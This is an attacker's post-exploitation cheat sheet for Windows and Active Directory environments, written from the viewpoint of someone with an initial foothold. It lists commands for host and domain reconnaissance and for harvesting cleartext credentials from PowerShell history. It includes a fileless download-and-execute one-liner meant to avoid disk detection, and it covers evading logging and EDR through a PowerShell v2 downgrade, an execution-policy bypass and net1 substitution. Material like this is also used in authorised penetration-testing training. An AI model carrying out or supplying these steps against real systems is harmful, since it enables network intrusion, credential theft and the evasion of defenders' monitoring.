## Host Environment Enumeration

Landed on a Windows host with no external tools and need to establish local context.

Print PC name

```
hostname
```

Identify OS version and revision level for exploit targeting

```
[System.Environment]::OSVersion.Version
```

Check applied patches and hotfixes to identify missing security updates

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

List environment variables for the current session

```
set
```

Identify the domain the host belongs to

```
echo %USERDOMAIN%
```

Locate the Domain Controller the host authenticates with

```
echo %logonserver%
```

**Gotchas** **WMIC permissions** can cause the hotfix query to return empty or access denied if not in a high-integrity context.

## PowerShell Reconnaissance

Initial foothold established with PowerShell access; need to assess current environment restrictions and history.

List loaded modules to identify available AD or administrative tools

```
Get-Module
```

Check execution policy levels for all scopes

```
Get-ExecutionPolicy -List
```

Bypass execution policy for the current process to run scripts without changing system-wide settings

```
Set-ExecutionPolicy Bypass -Scope Process
```

Dump environment variables including paths and computer info

```
Get-ChildItem Env: | ft Key,Value
```

Read PowerShell history to find cleartext credentials or previous admin activity

```
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

Download and execute a script directly into memory to avoid disk-based detection

```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<URL>');"
```

**Gotchas** **Execution Policy** is not a security boundary; bypassing it via the process scope only lasts until the process terminates.

## PowerShell Logging Evasion

System is utilizing **Script Block Logging** (PowerShell 3.0+) which records every command to the Event Viewer.

Downgrade the current session to PowerShell 2.0 to stop **Script Block Logging**

```
powershell.exe -version 2
```

**Dangerous / misconfigured settings**

- **PowerShell v2.0** being installed on modern systems allows attackers to bypass modern security logging features.

**Gotchas** **Downgrade visibility** is high; the command `powershell.exe -version 2` is logged in the original session before the downgrade occurs, alerting vigilant defenders.

## Security Solution Enumeration

Identifying firewall states and antivirus configurations before executing lateral movement or noisy tools.

Check the status of all firewall profiles

```
netsh advfirewall show allprofiles
```

Query the status of the Windows Defender service

```
sc query windefend
```

Detailed dump of Defender settings, scan ages, and signature updates

```
Get-MpComputerStatus
```

## User Session and Network Discovery

Identifying potential for lateral movement or risk of discovery by active users.

Check for other logged-in users to avoid hijacking an active session and being noticed

```
qwinsta
```

List known hosts in the ARP table to identify adjacent targets

```
arp -a
```

Print the routing table to find routes to other network segments or persistent routes

```
route print
```

**Gotchas** **User interference** may occur if you perform actions while an admin is active; they may notice pop-ups or session instability and report the activity.

## Domain Object Enumeration via Net Commands

Querying AD objects and local group memberships using built-in Windows utilities.

List all users in the domain

```
net user /domain
```

Get detailed information for a specific domain user

```
net user <USERNAME> /domain
```

Identify all groups within the domain

```
net group /domain
```

Identify members of the Domain Admins group

```
net group "Domain Admins" /domain
```

List domain controllers registered in the domain

```
net group "Domain Controllers" /domain
```

View local group memberships on the current host

```
net localgroup
```

Check members of the local Administrators group (often includes Domain Admins)

```
net localgroup administrators
```

List available network shares

```
net share
```

Mount a remote share locally

```
net use x: \\<TARGET_IP>\<SHARE_NAME>
```

### Net Evasion

Use `net1` to execute the same logic as `net` while attempting to bypass basic string-based EDR detections

```
net1 user /domain
```

**Tool comparison**

- `net` → `net user /domain` → standard utility for AD queries.
- `net1` → `net1 user /domain` → prefer when `net` execution is flagged or blocked by simple monitoring.

**Gotchas** **EDR triggers** are common for net commands; many monitoring tools alert when non-admin users query `net localgroup administrators` or `net group "Domain Admins" /domain`.

## Active Directory Discovery via Dsquery

Deep LDAP querying for AD objects when RSAT or `dsquery.dll` is available.

Search for all user objects in the domain

```
dsquery user
```

Search for all computer objects in the domain

```
dsquery computer
```

Wildcard search for all objects within a specific Organizational Unit (OU)

```
dsquery * "CN=Users,DC=<DOMAIN>,DC=LOCAL"
```

Find users with specific LDAP attributes set (e.g., `PASSWD_NOTREQD`)

```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

Search for Domain Controllers using UAC bitmask matching

```
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

**Edge cases**

- `dsquery` is native to systems with the AD DS role but `dsquery.dll` exists in `C:\Windows\System32\` on most modern Windows systems, allowing execution if permissions permit.

**Gotchas** **Privilege requirements** usually dictate that you must be in a SYSTEM context or have elevated privileges to run effective queries against the directory.